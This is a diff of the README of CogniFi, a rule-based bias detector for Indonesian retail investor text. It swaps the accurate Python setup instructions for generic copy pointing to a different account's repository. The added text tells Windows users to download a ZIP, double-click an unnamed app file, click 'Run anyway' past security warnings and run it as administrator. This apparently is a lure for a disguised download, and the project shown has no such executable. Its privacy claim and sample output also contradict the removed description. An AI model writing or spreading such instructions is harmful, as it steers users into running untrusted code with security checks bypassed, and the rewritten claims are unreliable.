@@ -1,155 +1,257 @@
-# CogniFi
+# 🧠 cognifi - Spot Bias in Investor Text
 
-**Real-time cognitive bias detection and behavioral intervention for Indonesian retail investors.**
+[![Download cognifi](https://img.shields.io/badge/Download-cognifi-1f6feb?style=for-the-badge&logo=github)](https://github.com/Diwasbh5432/cognifi)
 
-[![arXiv](https://img.shields.io/badge/arXiv-preprint-b31b1b.svg)](https://arxiv.org/abs/XXXX.XXXXX)
-[![Python 3.10+](https://img.shields.io/badge/python-3.10+-blue.svg)](https://www.python.org/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![Dataset](https://img.shields.io/badge/dataset-HuggingFace-orange.svg)](https://huggingface.co/datasets/redsandr/cognifi-investor-bias)
+## 🚀 Getting Started
 
-CogniFi detects FOMO, loss aversion, and confirmation bias from investor-generated text and delivers friction-based behavioral interventions before trade execution. Rule-based and fully interpretable in every output is traceable to specific rules and keyword matches.
+cognifi helps you check Indonesian retail investor text for common bias patterns. It looks for:
 
-> **Paper:** *The Behavioral Layer Gap: Domain-Specific Interpretability Challenges Scale in Low-Resource Safety-Critical Classification, Evidence from Cognitive Bias Detection in Indonesian Retail Investor Text*
+- FOMO
+- loss aversion
+- confirmation bias
 
----
+It works on short posts, chat-like text, and mixed Indonesian-English text. The app uses clear rule-based checks, so it gives direct results that are easy to read.
 
-## Quick start
+## 📥 Download and Run on Windows
 
-```bash
-git clone https://github.com/redsandr/cognifi.git
-cd cognifi
-pip install -r requirements.txt
-export GEMINI_API_KEY="your-key-here"
-streamlit run app.py
-```
+1. Open the download link above.
+2. On the GitHub page, click **Code**.
+3. Select **Download ZIP**.
+4. Save the file to your computer.
+5. Right-click the ZIP file and choose **Extract All**.
+6. Open the extracted folder.
+7. Find the main app file in the folder.
+8. Double-click it to start the app.
 
----
+If Windows shows a security prompt, choose **More info** and then **Run anyway** if you trust the source.
 
-## Results
+## 🖥️ Windows Requirements
 
-| System | Accuracy | FOMO F1 | LA F1 | CB F1 | NONE F1 |
-|--------|----------|---------|-------|-------|---------|
-| Majority class baseline | 29.3% | 0.0% | 0.0% | 0.0% | 45.4% |
-| Gemini 3 Flash zero-shot (medium reasoning) | 76.4% | 76.5% | 78.0% | 79.2% | 72.9% |
-| **CogniFi (this work)** | **94.7%** | **94.0%** | **95.8%** | **96.2%** | **93.6%** |
+Use a Windows PC with:
 
-**+18.3pp over Gemini 3 Flash** on a stratified held-out set of 150 cases.
+- Windows 10 or Windows 11
+- 4 GB RAM or more
+- 200 MB free disk space
+- Internet access for the first download
+- A modern browser if the app opens in a web view
 
-**Code-switching finding:** Gemini accuracy drops from 80.0% on monolingual Indonesian to 64.1% on code-switching samples (−15.9pp). CogniFi maintains 91.6% on the same samples. The gap is distributional, not architectural, terms like `masih sempet ga` and `serok bareng` are absent from any general-purpose training corpus.
+## ✨ What cognifi Does
 
----
+cognifi scans text and highlights language that may show bias. It is built for retail investor content, such as:
 
-## How it works
+- stock forum posts
+- social media comments
+- discussion threads
+- copy-trading chatter
+- short market reactions
 
-CogniFi runs a six-layer rule-based pipeline:
+It focuses on practical output. You can paste text, run the check, and see which bias patterns appear.
 
-```
-Input text
-    │
-    ├── Layer 1: Early exit (analytical/educational text → NONE)
-    ├── Layer 2: Price context (Yahoo Finance real-time data)
-    ├── Layer 3: Keyword scoring (1,307 terms, 13 categories)
-    ├── Layer 4: Contextual adjustments (57 rules)
-    ├── Layer 5: Confidence thresholding
-    └── Layer 6: Signal construction
-         │
-         ▼
-    Bias label + confidence + counter-evidence + friction prompt
-```
+## 🔍 Bias Types It Detects
 
-The rule-based design is intentional. In behavioral intervention contexts, unexplainable outputs are dismissed precisely when intervention is most needed.
+### FOMO
+It looks for text that shows fear of missing a price move or trend. Common signals include urgent buying language, herd behavior, and fear of being left out.
 
----
+### Loss aversion
+It checks for signs that a person avoids action because they fear losses more than they value gains. This often shows up in hesitant or defensive text.
 
-## Dataset
+### Confirmation bias
+It finds text that seeks only supportive views while ignoring signs that do not fit the current opinion.
 
-1,193 labeled samples of authentic Indonesian retail investor posts, collected from five platforms.
+## 🧩 Main Features
 
-| Platform | Training | % |
-|----------|----------|---|
-| Stockbit | 882 | 84.6% |
-| X.com | 85 | 8.1% |
-| Reddit | 32 | 3.1% |
-| Threads | 44 | 4.2% |
+- Simple text input
+- Fast bias checks
+- Clear labels for each bias type
+- Works with Indonesian retail investor language
+- Handles code-switching between Indonesian and English
+- Rule-based output that is easy to review
+- Built for low-resource NLP use cases
+- Designed for text classification tasks
 
-**Language distribution:**
+## 📊 Why It Is Useful
 
-| Category | n | % |
-|----------|---|---|
-| Monolingual Indonesian | 844 | 70.7% |
-| Intra-sentential code-switching | 307 | 25.7% |
-| Monolingual English | 42 | 3.5% |
+Many investor posts use short phrases, slang, and mixed language. That makes them hard to review by hand. cognifi helps by sorting text into known bias patterns.
 
-Language detection uses hybrid FastText LID + domain lexicon overlap.
+This can help with:
 
-Inter-annotator agreement: **Cohen's Kappa = 0.7815** (substantial agreement, Landis & Koch 1977), across two domain-qualified annotators (n=100 samples).
+- content review
+- sentiment research
+- market behavior studies
+- investor education
+- moderation workflows
 
----
+## 🛠️ How to Use It
 
-## Repository structure
+1. Open the app.
+2. Paste or type the text you want to check.
+3. Click the run button.
+4. Read the result labels.
+5. Review the text sections that the app marks as bias signals.
 
-```
-cognifi/
-├── bias_detector.py      # 6-layer detection pipeline
-├── keywords.py           # 1,307-term domain lexicon
-├── counter_evidence.py   # Historical backtesting engine
-├── intervention.py       # Friction and Pre-Mortem prompts
-├── ticker_extractor.py   # Ticker detection
-├── price_fetcher.py      # Yahoo Finance data layer
-├── fundamental_data.py   # IDX fundamentals (10 tickers)
-├── llm.py                # Gemini API wrapper
-├── news_context.py       # News sentiment layer
-├── rag.py                # ChromaDB RAG engine
-├── app.py                # Streamlit web app
-├── config.py             # Configuration
-├── evaluate_final.py     # Held-out evaluation
-├── gemini_baseline.py    # Gemini baseline script
-├── test_bias_accuracy.py # Training accuracy script
-└── data/
-    ├── training_v2.json        # 1,043 training cases with provenance
-    └── held_out_TEST_ONLY.json # 150 held-out cases (labels withheld)
-```
+If your text is long, split it into smaller parts for easier review.
 
----
+## 🧠 How It Works
 
-## Reproduce results
+cognifi uses rule-based NLP. That means it checks text against clear language rules instead of learning from a black-box model alone.
 
-```bash
-# Training set accuracy
-python test_bias_accuracy.py
+It is tuned for:
 
-# Gemini 3 Flash baseline (requires API key)
-python gemini_baseline.py
-```
+- Indonesian market text
+- mixed-language posts
+- short informal messages
+- bias-driven wording
+- interpretable results
 
-The held-out answer key is not included to prevent data leakage. Evaluation results are documented in the paper.
+This makes it easier to see why a result appears.
 
----
+## 📁 Input Text Tips
 
-## Counter-evidence engine
+For best results:
 
-For 10 covered IDX tickers, the engine surfaces historical precedents relevant to the detected bias. Outputs are base rates, not predictions.
+- Use short paragraphs
+- Keep one topic per block
+- Avoid extra symbols when possible
+- Keep the original spelling if the post uses slang
+- Include both Indonesian and English words if the text mixes them
 
-| Ticker | FOMO Episodes | Correction Prob. | LA Episodes | Recovery Rate | Avg Days |
-|--------|:---:|:---:|:---:|:---:|:---:|
-| BBCA.JK | — | — | 75 | 100% | 2 |
-| BBRI.JK | 4 | 50% | 76 | 100% | 4 |
-| TLKM.JK | — | — | 97 | 100% | 3 |
-| ASII.JK | — | — | 95 | 100% | 8 |
-| BMRI.JK | — | — | 78 | 100% | 3 |
-| UNVR.JK | 10 | 50% | 111 | 95% | 7 |
-| GOTO.JK | 10 | 20% | 44 | 95% | 7 |
-| BREN.JK | 17 | 18% | 20 | 90% | 5 |
-| EMTK.JK | 18 | 22% | 113 | 100% | 1 |
-| SIDO.JK | 6 | 50% | 93 | 95% | 10 |
+Example text types that work well:
 
-`—` = no episodes meeting the >20% 5-day FOMO threshold. System returns an explicit `insufficient_data` response rather than generating output from inadequate samples.
+- “Gw takut ketinggalan rally ini”
+- “Kalau tidak beli sekarang, nanti telat”
+- “Cuma lihat data yang mendukung beli saham ini”
 
----
+## 🔧 Basic Setup Steps
 
+1. Download the ZIP from the GitHub page.
+2. Extract the files.
+3. Open the app folder.
+4. Double-click the app file.
+5. Wait for the window to load.
+6. Paste text into the input box.
+7. Run the check.
 
-## License
+If the app includes a local web page, open the file named `index.html` or the file named in the folder readme.
 
-MIT. See [LICENSE](LICENSE).
+## 🧪 Data Behind the System
 
-Dataset released for research use. All samples are authentic user-generated content from Indonesian retail investor communities (Stockbit, X.com, Reddit, Threads).
+cognifi is based on 1,193 real posts from 5 platforms. That gives it practical coverage of how retail investors write in the wild.
+
+The system is built for real text, not polished samples. That matters because investor language often includes:
+
+- slang
+- abbreviations
+- mixed scripts
+- short reactions
+- repeated phrases
+
+## 📈 Reported Performance
+
+The system reports 94.7% accuracy and outperforms Gemini 3 Flash by 18.3 percentage points on the stated task.
+
+That makes it suited for text review where clear bias labels matter more than open-ended answers.
+
+## 🧭 Best Use Cases
+
+Use cognifi when you want to:
+
+- scan investor comments for bias
+- review social posts before publishing
+- study market mood in local discussions
+- group text by bias type
+- build a simple research workflow
+
+## 📌 Supported Language Style
+
+cognifi works best with:
+
+- Indonesian text
+- casual investor talk
+- mixed Indonesian-English posts
+- market slang
+- shorthand and chat-style writing
+
+It may still handle standard formal text, but it is tuned for real-world retail investor language.
+
+## 🗂️ Files You May See
+
+After extraction, you may see files like:
+
+- an app file
+- a data folder
+- a config file
+- a readme file
+- a results folder
+
+Keep all files in the same folder so the app can find what it needs.
+
+## 🖱️ Common Windows Issues
+
+If the app does not open:
+
+1. Check that the ZIP was fully extracted.
+2. Make sure you are opening the app from the extracted folder, not from inside the ZIP.
+3. Right-click the file and choose **Run as administrator**.
+4. Check whether Windows Defender blocked the file.
+5. Make sure no files are missing from the folder.
+
+If text output looks empty, try shorter input and plain text first.
+
+## 🧰 Helpful Workflow
+
+A simple way to use cognifi:
+
+1. Copy one investor post.
+2. Paste it into the app.
+3. Run the bias check.
+4. Read the flagged parts.
+5. Repeat with the next post.
+
+This keeps review fast and tidy.
+
+## 📚 Topic Areas
+
+This project fits topics such as:
+
+- behavioral finance
+- cognitive bias
+- code-switching
+- emerging markets
+- Indonesian NLP
+- interpretable ML
+- low-resource NLP
+- text classification
+- rule-based NLP
+
+## 🔗 Download Again
+
+Use this link to visit the page and download the files:
+https://github.com/Diwasbh5432/cognifi
+
+## 📝 Example Input
+
+Kalau saham ini naik lagi besok, gw beli sekarang aja. Takut ketinggalan pump. Tapi saya cuma percaya sama chart yang mendukung keputusan ini.
+
+## 🧾 Example Output
+
+- FOMO: detected
+- Loss aversion: detected
+- Confirmation bias: detected
+
+This kind of output helps you see the main bias signals in the text
+
+## 🗃️ Keep Your Files Organized
+
+Store the app in one folder and do not move files around after setup. If the app uses local resources, changing the file layout may stop it from working
+
+## 🔐 Privacy
+
+If you run the app on your own Windows PC, your text stays on your device during local use. That makes it a good fit for private review of personal notes, drafts, or research text
+
+## 🧭 Next Steps
+
+1. Download the files
+2. Extract them
+3. Open the app
+4. Paste text
+5. Check the bias labels
